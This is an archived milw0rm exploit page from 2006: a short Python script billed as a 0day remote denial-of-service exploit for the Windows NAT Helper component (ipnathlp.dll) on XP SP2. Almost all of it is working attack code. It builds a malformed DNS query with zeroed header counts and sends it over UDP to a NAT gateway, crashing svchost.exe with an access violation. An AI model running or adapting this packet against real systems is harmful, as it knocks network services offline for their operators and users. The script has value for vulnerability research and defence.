<html><head><title>MS Windows NAT Helper Components (ipnathlp.dll) Remote DoS Exploit</title></head><pre>#!/usr/bin/python
# Microsoft Windows NAT Helper Components (ipnathlp.dll) 0day Remote DoS Exploit
# Bug discovered by h07 &lt;h07@interia.pl&gt;
# Tested on XP SP2 Polish
# Details:
#
# Exploit(192.168.0.2) --&gt; Microsoft NAT(192.168.0.1) --&gt; [..Internet..]
#
# [Process svchost.exe, module ipnathlp]
# --&gt; MOV DL, [EAX]
# Exception C0000005 (ACCESS_VIOLATION reading [00000000])
##

from socket import *
from time import sleep

host = &quot;192.168.0.1&quot;
port = 53

buffer = ( # DNS (query)
&quot;\x6c\xb6&quot; # Transaction ID: 0x6cb6
&quot;\x01\x00&quot; # Flags: 0x0100 (Standard query)
&quot;\x00\x00&quot; # Questions: 0
&quot;\x00\x00&quot; # Answer RRs: 0
&quot;\x00\x00&quot; # Authority RRs: 0
&quot;\x00\x00&quot; # Additional RRs: 0 &lt;-- Bug is here (0, 0, 0, 0)
&quot;\x03\x77\x77\x77&quot; #
&quot;\x06\x67\x6f\x6f&quot; #
&quot;\x67\x6c\x65\x03&quot; #
&quot;\x63\x6f\x6d\x00&quot; # Name: www.google.com
&quot;\x00\x01&quot; # Type: A (Host address)
&quot;\x00\x01&quot; # Class: IN (0x0001)
)

s = socket(AF_INET, SOCK_DGRAM)
s.connect((host, port))
s.send(buffer)
sleep(1)
s.close()

# EoF

# milw0rm.com [2006-10-28]</pre></html>